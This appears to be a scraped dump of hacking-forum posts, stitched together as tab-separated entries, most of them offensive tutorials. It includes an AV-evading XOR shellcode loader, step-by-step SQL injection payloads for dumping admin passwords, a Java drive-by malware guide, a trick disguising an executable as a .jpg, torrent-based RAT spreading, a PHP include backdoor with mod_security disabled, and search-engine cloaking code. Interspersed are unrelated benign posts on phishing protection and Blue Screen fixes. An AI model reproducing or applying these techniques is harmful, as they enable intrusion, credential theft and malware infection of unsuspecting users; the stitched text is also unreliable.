knowing how to slap togother a binary with a shellcode payload yourself? Well there are a number of reasons: People get busy and tools become deprecated The binaries generated by tools become fingerprintable; not the payload necessarily, but the compiled structure of the binary. As a penetration tester, you should really know how to do this. Ups your leet cred.. or so I hear. Before you take a look at the below code, its worth noting that this is targeting the windows platform; as obviously noted with the reference to windows.h ;) #include <windows.h> #include <iostream> int main(int argc, char **argv) {  char b[] = {/* your XORd with key of x shellcode goes here i.e. 0x4C,0x4F, 0x4C */};  char c[sizeof b];  for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ x;}  void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  memcpy(exec, c, sizeof c);  ((void(*)())exec)(); } Quite simply, the above code creates a character array with shell code you can add, performs an XOR operation with the incredibly sophisticated key of lowercase x, allocates some memory, copies the character array in said allocated memory, and executes it. It may be worth highlighting that you will need to XOR your shellcode with your key of choosing (in this case x) before you put it in the above code and compile. So you are probably looking at that and thinking really? - I know how you feel. This is how I felt after I intended this to be step 1 of my tutorial and I ran it through virustotal and it returned 0/56 detection. Id like to stress that this is an incredible simple and most basic technique, yet its success is still rather astonishing. I originally wrote this example and tested it on virus total a while ago, but I did reanalyze the executable on virustotal at the time of publishing this post and found it still had a 0 detection rate. The binary you generate will very likely not match the SHA256 of the binary I have tested; the binary I uploaded contained shellcode generated with the metasploit framework. Final Comments Alright, so antivirus is dead. We all know that. That being said, we cant argue that over 95% of organizations are still depending on antivirus to protect endpoints.  Is there a better way? certainly. A number of vendors, which I shall not name, have launched products that take a new approach to protecting endpoints primarily focusing on identification of known exploit techniques. This is usually performed by way of injecting DLLs in to processes that will monitor for these known techniques and prevent the exploit from working successfully.  Is this fool proof technique? I would be inclined to say no. The bar will be raised, but a new type of cat and mouse game will begin. Final note: The above may not work on _all_ antivirus solutions. I figure that was obvious, but thought I would mention it before the pitch forks come after me! I FOUND THIS ONLINE :D   """
0	Hacking website using SQL Injection - step by step guide	""" Step 1: Finding Vulnerable Website: Our best partner for SQL injection is Google. We can find the Vulnerable websites(hackable websites) using Google Dork list. google dork is searching for vulnerable websites using the google searching tricks. There is lot of tricks to search in google. But we are going to use “inurl:” command for finding the vulnerable websites. Some Examples: inurl:index.php?id= inurl:gallery.php?id= inurl:article.php?id= inurl:pageid= Here is the huge list of Google Dork http://www.ziddu.com/ download/13161874/A… t.zip.html How to use? copy one of the above command and paste in the google search engine box. Hit enter. You can get list of web sites. We have to visit the websites one by one for checking the vulnerability. So Start from the first website. Note:if you like to hack particular website,then try this: site:www.victimsite.com dork_list_commands for eg: site:www.victimsite.com inurl:index.php?id= Step 2: Checking the Vulnerability: Now we should check the vulnerability of websites. In order to check the vulnerability ,add the single quotes(‘) at the end of the url and hit enter. (No space between the number and single quotes) For eg: http://www. victimsite. com/ index.php? id=2 If the page remains in same page or showing that page not found or showing some other webpages. Then it is not vulnerable. If it showing any errors which is related to sql query,then it is vulnerable. Cheers..!! For eg: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1 Step 3: Finding Number of columns: Now we have found the website is vulnerable. Next step is to find the number of columns in the table. For that replace the single quotes(‘) with “order by n ” statement.(leave one space between number and order by n statement) Change the n from 1,2,3,4,,5,6,…n. Until you get the error like “unknown column “. For eg: http:// http://www.victimsit e.com/ index.php? id=2orderby 1 http:// http://www.victimsit e.com/ index.php? change the number until you get the error as “unknown column” if you get the error while trying the “x”th number,then no of column is “x-1″. I mean: http:// http://www.victimsit e.com/ index.php? id=2orderby 1(noerror) http:// http://www.victimsit e.com/ index.php? so now x=8 , The number of column is x-1 i.e, 7. Sometime the above may not work. At the time add the “–” at the end of the statement. For eg: http://www. victimsite. com/ index.php? id=2orderby 1-- Step 4: Displaying the Vulnerable columns: Using “union select columns_sequence ” we can find the vulnerable part of the table. Replace the “order by n” with this statement. And change the id value to negative(i mean id=-2,must change,but in some website may work without changing). Replace the columns_sequence with the no from 1 to x-1(number of columns) separated with commas(,). For eg: if the number of columns is 7 ,then the query is as follow: http://www. victimsite. com/ index.php? id=-2union select 1,2,3,4,5,6,7 -- If the above method is not working then try this: http://www. victimsite. com/ index.php? id=-2and1=2 unionselect 1,2,3,4,5,6,7 -- It will show some numbers in the page(it must be less than ‘x’ value, i mean less than or equl to number of columns). Like this: Now select 1 number. It showing 3,7. Let’s take the Number 3. Step 5: Finding version,database,user Now replace the 3 from the query with “version()” For eg: http://www. victimsite. com/ index.php? id=-2and1=2 unionselect 1,2,version (),4,5,6,7-- It will show the version as 5.0.1 or 4.3. something like this. Replace the version() with database() and user() for finding the database,user respectively. For eg: http://www. victimsite. com/ index.php? id=-2and1=2 unionselect 1,2,database (),4,5,6,7-- http://www. victimsite. com/ index.php? id=-2and1=2 unionselect 1,2,user (),4,5,6,7-- If the above is not working,then try this: http://www. victimsite. com/ index.php? id=-2and1=2 unionselect 1,2,unhex(hex (@@version)), 4,5,6,7-- Step 6: Finding the Table Name  if the version is 5 or above. Then follow these steps.  Now we have to find the table name of the database. Replace the 3 with “group_concat (table_name) and add the “from information_schema.tables where table_schema=database()” For eg: http:// http://www.victimsit e.com/ index.php? id=-2and1=2 unionselect 1,2,group_con cat (table_name), 4,5,6,7from Now it will show the list of table names. Find the table name which is related with the admin or user. Now select the “admin ” table. if the version is 4 or some others, you have to guess the table names. (user, tbluser).  It is hard and bore to do sql inection with version 4. Step 7: Finding the Column Name Now replace the “group_concat(table_name) with the “group_concat (column_name)” Replace the “from information_schema.tables where table_schema=database()–” with “FROM information_schema. columns WHERE table_name=mysqlchar– Now listen carefully ,we have to find convert the table name to MySql CHAR () string and replace mysqlchar with that . Find MysqlChar() for Tablename: First of all install the HackBar addon: https://addons.mozilla.org/ en-US/firefox/addon/3899/ Now select sql->Mysql- >MysqlChar() This will open the small window ,enter the table name which you found. i am going to use the admin table name. click ok Now you can see the CHAR(numbers separated with commans) in the Hack toolbar. Copy and paste the code at the end of the url instead of the “mysqlchar” For eg: http:// http://www.victimsite.com/ index.php?id=-2 and 1=2 union select 1,2,group_concat (column_name),4,5,6,7 from information_schema.col umns where table_name=CHAR(97, Now it will show the list of columns. like admin,password,admin_id, admin_name,admin_ password,active,id,admin_ name,admin_pas s,admin_id,admin_name, admin_password,ID_admin, admin_username,username, password..etc.. Now replace the replace group_concat (column_name) with group_concat (columnname ,0x3a, anothercolumnname). Columnname should be replaced from the listed column name. anothercolumnname should be replace from the listed column name. Now replace the ” from information_schema. columns where table_name=CHAR(97, 100, 109, 105, 110)” with the “from table_name” For eg: http:// http://www.victimsit e.com/ index.php? id=-2 and1=2union select 1,2,group_con cat (admin_id,0x3 Sometime it will show the column is not found. Then try another column names Now it will Username and passwords. Enjoy..!!cheers..!! If the website has members then jock-bot for you. You will have the list of usernames and password. Some time you may have the email ids also,enjoy you got the Dock which can produce the golden eggs. Step 8: Finding the Admin Panel: Just try with url like: http:// http://www.victimsit e.com/ admin.php http:// http://www.victimsit e.com/admin/ http:// http://www.victimsit e.com/ etc. If you have luck ,you will find the admin page using above urls. or try this list . Here is the list of admin urls: http://www.ziddu.com/ download/13163866/A… t.zip.html Note: This is just for educational purpose only.

0	How to create a DVDRip	"""   In order to create a DVD rip, you will need a few programs: [b]DVD Decrypter - Download   HERE. Auto GK - Download   HERE. AVI-MUX - Download   HERE. AnyDVD - Download here or purchase legally   The installation of these programs is pretty self-explanatory, so Ill leave that part to you. Now, insert the DVD you wish to rip into the DVD drive on your computer. As far as the AnyDVD program goes, just be sure that you have it running in the background, youll know if its running by taking a glance at your notification area (lower right of your screen) when inserting your DVD:  You are only going to be using AnyDVD to bypass the encryption software on the DVD, it does all of this in the background so you really dont have to do anything with this program other than verify its running. Next, open up DVD Decrypter. Start > All Programs > DVD Decrypter > DVD Decrypter For this example, I will be ripping Lord of the Rings: Return of the King. After DVD Decrypter is opened youll see something like this:    If you have a certain folder to where you would like the files to be ripped, specify it by clicking: Note: Make sure you have at least 8-9 GB of free space on your hard drive. Typical rips use up about 7 GB of space, so make sure your hard drive has enough free space on it. Now, to begin the ripping process, click: After clicking that, DVD Decrypter starts copying the files (while AnyDVD decrypts the copyright protection) to your specified folder, seen here:    Note: The ripping process could take a while, sometimes even an hour, depending on how fast your computer is. The best thing to do is just let it sit, go eat a sandwich while you wait for your DVD to be done copying. Once the files have been ripped, DVD Decrypter will play a sound and a box like this will pop up:    Now that the files have been ripped, we need to turn them into a .avi file using Auto GK. As seen in this screenshot, I have ripped a movie and have ended up with these files. These files are playable via VLC Player, but avi provides much better compression, portability, and compatibility.    Next, you need to make sure you have enabled the option in Windows that allows you to view file extensions. The following steps should work in any edition of Windows. Open up My Computer/Computer and then click Tools (next to File, Edit, etc). To see this in Vista, you may need to open up Computer and then press the Alt key. This should allow you to see the File, Edit, View, etc options. After youve clicked Tools, click \""Folder Options...\"" You should see something like this:    If you see this, youve done everything right so far. Now click the \""View\"" tab. Look for an option (about half way down) that says \""Hide extensions for known file types.\"" Make sure this box is NOT checked, and then press OK. Install Auto GK and open it up. Click the icon next to the \""Input file\"" field, it looks like this: The \""Open\"" box appears, now navigate to the folder where your ripped files are. Should look like this:    Now click the \""View Menu\"" by clicking this icon A list of options is displayed, click on \""Details\"" Now your screen will look something like this   Now, all thats left to do is pick the correct .ifo file. Do NOT select a .vob file, as this will not give you the result you desire. To determine which .ifo file is the correct one (some DVD rips will contain 5 or even more .ifo files, so be sure to select the right one!), you must understand that each .vob file belongs to a corresponding .ifo file. So, in the screenshot above, any .vob file with the name VTS_01_x.vob (where x represents any number) belongs to the VTS_01_0.ifo file. So, if I had a .vob file named \""VTS_05_1.vob\"" it would belong to an .ifo file with the name \""VTS_05_0.ifo\"". We know this because they each have a \""05\"" after the first underscore. So now you know how to tell which .vob files correspond to which .ifo files. This is dandy, but you still dont know which .ifo file to pick. Quite simply, the .ifo file that you should pick is the one that has the biggest .vob files associated with it. In my example, \""VTS_01_0.ifo\"" clearly has the biggest .vob files associated with it. But my example could be easier than the movie youre dealing with, you may have 5 or more .ifo files to look through before you choose the correct one. At any rate, just choose the one that has the biggest .vob files associated with it. Now that youve selected the correct .ifo file, press open. Now youll see that the \""Input file\"" field is filled, while the \""Output file\"" field is not. Click this icon once again, but this time click the one for the Output file: Navigate to the directory in which youd like your .avi movie to be saved to, then click Save. Now, looking on to where Auto GK has \""Step 2,\"" youll see options for audio tracks and subtitle tracks. Do as you please with these settings. If you are confused as to what audio tracks to include, AC3 is the best, and 6ch will provide 6 channels of sound (built for surround sound) while 2ch will provide 2 channels of sound (built for stereo). Do as you please with these settings. On to Step 3, you have options for size. Once again, do as you please with these settings. As a rule of thumb, I would NEVER use any of the \""Predefined size\"" options, as they split the movie into multiple .avi files sometimes. So, for example, if you used the \""2 CDs (1400 Mb)\"" option, then you would have two 700 MB .avi files. The reasoning behind this is that youre supposed to choose this if you were planning on burning your .avi files to 2 seperate CDs. If you have a certain size in mind (such as a torrent uploader, who would typically use 700 MB), then use the \""Custom size\"" option. Otherwise, use the \""Target quality\"" setting, which will not try to restrict the file size, it will simply covert the DVD files into .avi, regardless of the output size. This option, as far as quality goes, is much better than the \""Custom size\"" option because it wont restrict the quality due to file size. A movie at 100% quality will still not take up more than 2 gigs or so. In the \""Advanced Settings\"" (Step 4), make sure you have XviD selected since it will produce a better picture. Other than that, Id leave these settings alone, but feel free to mess with them. Now youre ready to begin conversion. Click \""Add Job,\"" then click \""Start.\"" The conversion process could take a very long time, Ive found out its most convenient to just run the program and then go to bed so it converts while I sleep. Note: For even more advanced options, you can access Auto GKs hidden features by pressing Ctrl+F9. These are for very advanced users. After you have turned your ripped DVD into a .avi file, open it up to play it and see if the sound matches up with whats happening on screen. If the sound does not quite match up, use AVI-MUX to fix it. If everything is fine, skip the AVI-MUX section of this tutorial. After youve opened AVI-Mux, look at the top where it says \""open files (add files via drag & drop).\"" The blank white space below this text is where youll want to drag and drop the .avi file for which you want to synchronize the sound. If you want to drag and drop the .avi file, feel free to do so, but you may find it easier to right click on the white space and click \""add\"" which will let you navigate to the .avi file and select it. Pick your method and then add the file you wish to edit. Should look like this so far:    Now, highlight the movie you put in that white space, and then click the \""generate data source from files\"" button. In the BIG white space (not the one referred to above), youll see something listed similar to this: Now, select the audio (seen above) and to the right of it youll see this:    By inserting a number into this field, youll be delaying the time when the audio starts. If the sound of the .avi needs to start later, experiment using positive numbers so the sound does not start as quickly and will line up with whats happening on the screen. On the other hand, if the sound is too delayed, try using negative numbers so the sound in the movie starts sooner. There is no real way to get this perfect, its simply trial and error. Keep experimenting with different numbers until you get it perfect, it takes me 20+ tries sometimes. After youve inserted a number, click \""start.\"" What this program is doing, is creating a new .avi file identical to the old one, but this time the sound will be delayed according to what number you put in the delay field. So, after clicking \""start\"" youll be asked where to save the new .avi file. Save it somewhere and then AVI-Mux will begin generating the new .avi file. This should only take a maximum of two minutes or so. Now, test out the new .avi and see if its any better than the original. If not, then just delete it and keep trying (make sure you dont delete the original though!). Now you have successfully made your DVDRip.Congrats;)   """

The set of different keys which he can try one by one to open the lock , the hammer with him which he can use to break the glass window etc can be the exploits.   Payload-   Now Finally after exploiting the vulnerability and breaking in , he can have different things to do. He can steal money, destroy the things or just can give a look and come back..

0	Creating A Java Driveby [FUD]	""" If you use this and it helped, please leave a comment saying so! So I was looking up how to create a java driveby, and I couldnt find any good tutorials on how to do it. I spent a few hours looking around on other websites until I collected all the information I needed to make one. So now I am sharing that information with Hackforums for free! This driveby will be FUD as long as your virus is 100% FUD. Here We Go! How to Create a Java Driveby Step 1: Download all the files you need from here: https://www.box.com/s/mzuatnj8jf87w30fiqq2 or http://rghost.net/46733953 or http://ge.tt/3pPdKLj/v/01 Step 2: You will need to make your own HTML code to put the driveby on, \""steal\"" another websites HTML, or use the Cam Site Template HTML that I included. Step 2 1/3: If you stole or made your own HTML code for the website, paste the HTML code BELOW the existing code in the index.html of the first folder. It should look like this: Step 2 2/3: If you used the template, take the java.jar, java.png and load.gif and place them in the template file. Step 3: Rename your virus.exe to java.exe to make it less suspicious, and then upload the java.exe to a website where you can get a DIRECT download link. (I used Mediafire because my virus is 100% FUD so it doesnt get picked up by its virus scan) Take that direct download link and paste it into the part of the applet text that says \""DIRECT DOWNLOAD LINK TO VIRUS HERE\"" like so: Step 4: Now you are going to need a web host. I used  http://000webhost.com  as mine, but you can basically use whatever you want. NOTE In this tutorial I am assuming you know how a webhost works and how to FTP file transfer. There are plenty of tutorials out there and this is a creating a Java Driveby tutorial, not a web development tutorial, so I apologize. Step 5: Use an FTP file transfer to either add all of your files to the webhost or all of the template files to the webhost. Step 6: If everything has been done correctly go to  http://www.yourwebsite.com  and you should get a screen that looks like this (with your website also, I used a blank template for this picture): Step 7: Share your website with people, and when they click run this time or always run on this site, they will get another popup asking if they are sure, and lets face it, they will more than likely click Continue. I know this is a short and simple tutorial, so If I missed anything in this tutorial please let me know! If you have suggestions on how to improve it also let me know! Feel free to PM me questions or leave them in the comments below for myself and other Hackforums members to answer. Thanks and have a good day """

0	Unimaginably  easy  way  to  earn  a  guaranteed $100  everyday	"""   Hello Everyone [COLOR=\""#FFA07A\""]I am sure at one point in your life, you have been haunted by bills and bills and bills. Mortgages,taxes,credit-cards,phone bills and the list goes on and on. Living in an age where minimal standards of living are proving to be sky high, it gets really back-breaking at times to maintain bills and not to mention the tension and stress we go through when bills payment date approaches us. However, meeting basic requirements lights up our lives and we can think of doing further constructive stuff with our money money. Well, the method I have presented to all of you will definitely make you a minimum of $50 daily and if you have the time and energy to scale things up, then you will be able to earn a great amount of money. Requirements: 1. Internet Connection and access to a PC 2. Ã¢â¬ËAssociated ContentÃ¢â¬â¢ account. 3. Ã¢â¬ËDragon Naturally SpeakingÃ¢â¬â¢ software. 4. Paypal account Step 1 Go to  http://www.associatedcontent.com  and click join now for an account for free. Step 2 You can register your own profile or you can register for an anonymous profile. Step 3 What you do at Associated Content is submit articles and get paid around $5- $7 an article. But, the articles have to be around 500 words or more. Therefore you cannot possibly sit and write 15-20 articles everyday. Its crazy! Step 4 So to make life easy what we do is download a voice recognition software. I use the Dragon Speech Recognition Software. It cost me $99 to purchase it. You can even download it for free from some website, although I would not recommend that because if there is some technical problem, you can directly contact customer support at the help desk at Nuance. Step 5 After you get the software, go to  http://www.ezinearticles.com Next, you choose any category that you like and around 9-10 articles under that category. Put all these articles on microsoft Word and save them on to a folder on your desktop. Read the articles that you have saved and make a few notes i.e. important points about each article. Step 6 Start the dragon naturally speaking software and start speaking out the article in your own words. It will keep typing whatever you say. DonÃ¢â¬â¢t worry about paragraphs and spelling mistakes as you can correct them later. Step 7 You have around 10 articles ready, proofread them and submit them to Associated Content. Make around $100 a day or more through this method[/COLOR]   """
0	| TUT | ★★★ How To Hide .exe Files Into .jpg ★★★ | TUT |	""" Hey guys, I Again wid a new tut. Today i m gonna show you how to hide .exe files into .jpg files :p. This is a good trick to hide your exe files into a jpg file! I didnt add pictures as I think the written tutorial is easier to understand. 1) Firstly, create a new folder and make sure that the options show  hidden files and folders is checked and Ã¢â¬Ëhide extensions for known file  typesÃ¢â¬â¢ is unchecked. Basically what you need is to see hidden files and see the extension of all your files on your pc. 2) Paste a copy of your server on the new created folder. lets say its  called server.exe (thats why you need the extension of files  showing, cause you need to see it to change it) 3) Now youÃ¢â¬â¢re going to rename this server.exe to whatever you want, letÃ¢â¬â¢s say for example picture.jpeg 4) Windows is going to warn you if you really want to change this extension from exe to jpeg, click YES. 5) Now create a shortcut of this picture.jpeg in the same folder. 6) Now that you have a shortcut, rename it to whatever you want, for example, me.jpeg. 7) Go to properties (on file me.jpeg) and now you need to do some changes there. 8) First of all delete all the text on field Start In and leave it empty. 9) Then on field Target you need to write the path to open the other  file (the server renamed picture.jpeg) so you have to write this :- C:\\WINDOWS\\system32\\cmd.exe /c picture.jpeg 10) The last field, c picture.jpeg is always the name of the first  file. If you called the first file soccer.avi you gotta write  C:\\WINDOWS\\system32\\cmd.exe /c soccer.avi. 11) So what youÃ¢â¬â¢re doing is when someone clicks on me.jpeg, a cmd will  execute the other file picture.jpeg and the server will run. 12) On that file me.jpeg (shortcut), go to properties and you have an  option to change the icon. Click that and a new window will pop up and  you have to write this :- %SystemRoot%\\system32\\SHELL32.dll . Then press OK. 13) You can set the properties Hidden for the first file  picture.jpeg if you think itÃ¢â¬â¢s better to get a connection from  someone. 14) But donÃ¢â¬â¢t forget one thing, these 2 files must always be together in  the same folder and to get connected to someone they must click on the  shortcut created not on the first file. So rename the files to whatever  you want considering the person and the knowledge they have on this  matter. 15) For me for example I always want the shortcut showing first so can  be the first file to be opened. So I rename the server to  picture2.jpeg and the shortcut to picture1.jpeg. This way the shortcut will show up first. If you set hidden properties  to the server picture.jpeg then you donÃ¢â¬â¢t have to bother with this  detail but IÃ¢â¬â¢m warning you, the hidden file will always show up inside  of a Zip or a Rar file. 16) So the best way to send these files together to someone is compress them into Zip or Rar. 17) inside the Rar or Zip file you can see the files properties and even  after all this work you can see that the shortcut is recognized like a  shortcut but hopefully the person you sent this too doesnÃ¢â¬â¢t know that  and is going to open it. Enjoy! ~N30-H4X0R-!ND!A~    """

0	How to protect yourself against phishing	"""   How to protect yourself against phishing 1. What is phishing? Phishing is the method of stealing login info(usernames and passwords) by directing the slave to a clone(fake) login page, that logs the login info without the knowledge of the slave. Such clone website is known as a phisher. 2. How to protect yourself against phishing? Use your login info in the correct places only. Dont ever put your login info anywhere else than the page you registered to, unless its a trusted service you know(such as youtube or blogger asking for your google accounts info). Make sure the website youre logging in isnt fake. Whenever you login to a website, if you didnt type the URL(address) of the website yourself, i.e. if you clicked a link that led you to the login page(from message, website, search engine results), always check the url(address) to see if youre in the right place.  For instance, if youre logging in your facebook account, make sure the url appears as  Hidden Content:  You must reply to see links ... Where a phisher page would look like  Hidden Content:  You must reply to see links ... or  Hidden Content:  You must reply to see links ... or any url whose part before the .com isnt exactly the same as the page you want to login to. Make sure the links youre clicking arent fake. Whenever youre clicking a link, check where the link goes before clicking it. Links can be masked to appear as something else than the page theyre leading to. For example,  Hidden Content:  You must reply to see links  leads to yahoo instead of google. Fortunately, in most browsers, whenever you point your mouse cursor over the link, the true location of the link is displayed on the bottom left part of the screen. Try it with the above link.  This is particularly important because it can protect you from another, rarer but more dangerous method called cookie stealing, which is basically automatically stealing your account if youre previously logged in the website. Know that links to phishing pages are usually spread via email, and often represent impersonating trusted services and persons, such as making the email appear as its sent from the website youve registered to, or a friend of yours whose account has been compromised. 3. What to do if you have spotted a phisher? Report the phisher as soon as you can. Report the phishers address here: Hidden Content:  You must reply to see links If the phishing attempt has been done via message, report the message in any of the following services: Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links If you received the message from a friends compromised account, inform your friend, and other friends that might be in danger. If possible, inform the admin of the website/forum that the phisher is made for. TuT by  Crow   """

"""     Hidden Content:  You must reply to see links           Update: Contrary to HSBCs claim, Fawkes Security said they did in fact steal sensitive debit card information for 20,000 accounts, but have not yet provided proof.

0	[Blackhat] Method To Get One-Way Backlinks	""" [h=1][Blackhat] Method To Get One-Way Backlinks[/h] Here is a method to get some one-way backlinks that works pretty well.  You need to get a secondary site. Set up something simple and contact  other webmasters to trade links (reciprocal links). It can be from a  different niche. After a few reciprocal links (10~30) we need to redirect our secondary  site to our main site. We will use a 301 redirect. But we will only  redirect search engines, not normal users. This way you can continue  with the reciprocal links and the other webmasters will not remove the  backlinks.  Use this code on the top of the PHP file(s) to redirect all the backlinks to your main site (don t forget to change your link): Quote: if (preg_match(\""#( [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ |yahoo! slurp|msnbot)#si\"", $_SERVER[HTTP_USER_AGENT])) { header(\""HTTP/1.1 301 Moved Permanently\""); header(\""Location:  Hidden Content:  You must reply to see links \""); exit; } Now you will have one-way backlinks to your main site. Google will  redirect the link juice to the main site and will not crawl the  backlinks of the other webmasters on the secondary site. Some notes: - you can use a better script to do that. - I believe that the secondary site will have the same pagerank after the redirection (or the actualization of pagerank). - It s easier to trade links on niches like games, porno etc. Keep that in mind, your goal is to trade many links. - you can redirect before the first backlinks, but I think this works better this way """

0	‎|| 403 Forbidden and cant read /ect/named.conf Error Bypass ||	"""   This Tut has been submitted by Sen Haxor  Now days most of the  2012 Linux Kernel server show this error when you try to symlink the  server . Most of the server which shows 403 forbidden has cant read  named.config error when you try to symlink using scripts like Symlink_Sa  or Madspot Security Team Shell or what ever script used for Automated  Symlink .       This can be bypassed by Reading /ect/passwd and Symlink_Sa 3.0 can be used to bypass this .    I will be posting the download link of some shells i will be using in this tutorial    Best Script which can bypass cant read /ect/named.conf are   : 1. Config Fucker By Web Root Hack Tools.   ( Mass Symlink Config files ) 2. Config Killer By Team Indishell . ( Mass Symlink Config file php based script )   3. Symlink Pain [~] allsoft.pl ( Perl Script to Mass Symlink Config files )   4. Symlink_Sa 3.0 Automated Symlink Script .   Usage : Config Fucker , Con   fig  Killer and Symlink Pain [~] Perl script just upload them on to the  server make sure that you create a new directory . Upload the scirpt and  use the command cat /ect/passwd to read all /ect/passwd from the server  and copy them and just open your script and paste it there and click on  Get Config and Your Done . Just open the link of the   folder you created eg . site.com/sen/allsoft.pl you need to open site.com/sen/ and all config files will be there  Note : Its better to create a php.ini file before you do this for 100 % Result    All 4 shells i have mentioned i will post the download link    And i will be using a another private shell for this which i wont be giving you all    for  Priv8 Issue its Mannu Shell Coded by Team Indishell Which can bypass  cant read /ect/named.conf error easily . But 403 Forbidden Server cant  be bypassed using this shell .  So now if we cant to symlink to the Public_html/ of the website we can use Symlink_sa 3.0 script Symlink Bypass Option -     So now that we can easily Symlink to /Public_html/ path of each website    Now some server show 403 forbidden Error when you try to Symlink them so now lets see how to by pass this shit    For 403 Forbidden Error i will be Using the Following Shells :   1. Dhanush Shell Coded By Arjun . ( This shell automitically creates .htaccess , php.ini and ini.php files after you login )   2. Mannu Shell by Team Indishell Private ! .   3. Symlink_sa 3.0 Script   I will be posting the download link of Dhanush shell and Symlink   _sa 3.0 ( Mannu shell is private as i already told  ) So what is the trick that makes us bypass 403 Forbidden    , Its just the .htaccess and php.ini which contains the following code : .htaccess   <IfModule mod_security.c> SecFilterEngine Off SecFilterScanPOST Off </IfModule>   php.ini   <?   echo ini_get(\""safe_mode\""); echo ini_get(\""open_basedir\""); include($_GET[\""file\""]); ini_restore(\""safe_mode\""); ini_restore(\""open_basedir\""); echo ini_get(\""safe_mode\""); echo ini_get(\""open_basedir\""); include($_GET[\""ss\""]); ?>   1.) 403 Forbidden Error :     2.) Open Dhanush Shell which automatically creates .htaccess , php.ini and ini.php .     3.) Mannu shell to Check if we Bypassed 403 Error   :     4.) Bypassed 403 Forbidden and Access to Public_html/ Path        Bypassed cant read /ect/named.conf and 403 forbidden Error    Here Download Link of all shell and script i used    :   Hidden Content:  You must reply to see this content Greetz : CyberAce Legion Who made me make this Tut and Team Indishell and all Indian Hackers .

0	Torrent Spreading	""" Torrent Spreading Preparation First I want to say that this is my first tutorial on HF. I know there are several tutorials about torrent spreading out there but since I lately used this method to get a lot of victims I wanted to make another tutorial about it. Things you need(in that order): The Pirate Bay account (best site in my opinion) patiernce crypter (sorry but your server hast to be crypted or it gets deleted) rat or keylogger or whatever you want to spread Step 1 Torrent accounts get banned very fast. If you donÃ¢â¬â¢t spread carefully you will get banned after a few hours. First you have to upload some legit stuff.  NO PROGRAMMS!!! You have to possibilities. 1) You can upload some movies(english is best) but I donÃ¢â¬â¢t like it because they have a pretty big filesize and itÃ¢â¬â¢s hard to get seeders with them 2) You can upload music. This ist he best method in my opinion. You can either upload new albums from the charts or unpopular bands that are hard to find. Step 2 Now you have tob e patient. Wait a week till you get to Step 3.  ItÃ¢â¬â¢s very important because it makes you look more legit. Sure you can upload other legit music or videos but still donÃ¢â¬â¢t upload programms. Step 3 Upload a legit programm.  Like WinRar or TotalCommander... something like this.  You can get such programms either from torrent site or from filesharing boards like Ã¢â¬Å¾warez-bbÃ¢â¬Å. Step 4 If you think your legit upload has enough seedersÃ¢â¬Â¦ around 20-30 is enough, you can start uploading your server.  But make sure that the programm you bind it to still works. Thats a misstake many people make.  Step 5 Upload 1-3 programms everyday and you will get more seeders and more downloads and also more installs.  I get around 20-30 installs a day with 5 servers uploaded. Some usefull tricks -Look at fresh torrents which programms are downloaded very often -Buy a trusted account and skip step 1-4 -Try to get into exclusiv torrent sitesÃ¢â¬Â¦ once you are in you will get much more installs Download Tools Code: http://rghost.net/45969389 http://ge.tt/35CTfWg/v/21   """

0	How to Solve Blue Screen Of Death Problem	"""   Today i am posting about a very serious problem of windows, that is  BSOD Blue Screen of Death is a very common error that occurs in all the versions of the Windows OS, be it Win XP, or Win Vista or Windows 7. Blue Screen Of Death (also known as  BSoD  or  bluescree n), known officially as a Stop Error. A lot of major as well as minor hardware and software related issues can lead to Blue Screen of Death (BSOD). However, many times the BSOD screen won’t allow you to reach the desktop or even if you have reached the desktop, the  BSOD  screen can appear all of a sudden while you are doing something important on your PC. BSODs appear when Windows encounters a serious problem and stalls the operating system. You can easily fix BSOD issues by examining all the factors that has triggered it. Here are some things you should do when you encounter a BSOD: 1. Some BSODs are so bad that you may end up installing fresh copy of Windows on your system. If you are not able to access your data after the occurrence of BSOD, you may also end up losing all your precious data. So, you need try your best to reach the desktop. You can try the ‘Last Known Good Configuration’ option or by going into the Safe Mode. You can try both of these options by pressing the F8 key before the appearance of the Windows loading screen. If you do it correctly, you will see the ‘Windows Advanced Options Menu’ screen where you will see options like Safe Mode, Safe Mode with Networking and Last Known Good Configuration. 2. When you see the BSOD, you should read the message that appears on it carefully. Usually, the error screen contains a ‘STOP ERROR’ code that consists of numbers and alphabets. The code varies depending on the problems that have caused the respective BSOD error. So, the first thing you need to do is make a note of the error code. 3. If your system is displaying the BSOD screen after recent installation of hardware or software, you can try uninstalling the hardware or software and see if that resolves the issue. After uninstalling the software that caused the problem, you can perform virus scan on your system. Repairing registry errors by making use of registry applications can help in getting rid of BSODs that are caused by software. Alternatively, you can also try the System Restore option to go back to a date when your system was working perfectly fine. 4. The next thing you need to is to find out what has caused the BSOD by researching on the internet. You can do this on your secondary PC. All you need to do is type the STOP ERROR code on Google and find out what solutions are available. A very good way to find solution for all kinds of BSOD errors is to visit the Microsoft Support website. At Microsoft Support, you will get all the possible solutions that you can try to get rid of the BSOD screen. Thank you.. :) Hope it will help you..!! :aikido:   """

